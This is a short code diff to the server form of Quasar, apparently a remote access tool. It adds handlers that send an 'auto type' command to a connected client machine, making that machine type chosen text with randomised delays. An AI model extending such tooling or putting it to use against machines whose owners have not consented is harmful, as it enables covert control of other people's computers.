@@ -729,12 +729,46 @@ namespace Quasar.Server.Forms
 
         private void btnKernel_Click(object sender, EventArgs e)
         {
-
+            
         }
 
         private void btnUnkernel_Click(object sender, EventArgs e)
         {
 
         }
+
+        private void btnAutoTypeStart_Click(object sender, EventArgs e)
+        {
+            FrmAutoTypeSetting dlgAuto = new FrmAutoTypeSetting();
+
+            DialogResult result = dlgAuto.ShowDialog();
+
+            if (result == DialogResult.OK)
+            {
+                if (_connectClient != null)
+                {
+                    _connectClient.Send(new DoAutoType
+                    {
+                        Action = "start",
+                        Text = dlgAuto.AutotypeContent,
+                        MinDelay = dlgAuto.MinDelayValue,
+                        MaxDelay = dlgAuto.MaxDelayValue
+                    });
+                }
+            }
+        }
+
+        private void btnAutoTypeStop_Click(object sender, EventArgs e)
+        {
+            if (_connectClient != null)
+            {
+                _connectClient.Send(new DoAutoType
+                {
+                    Action = "stop"
+                });
+            }
+        }
+
+
     }
 }
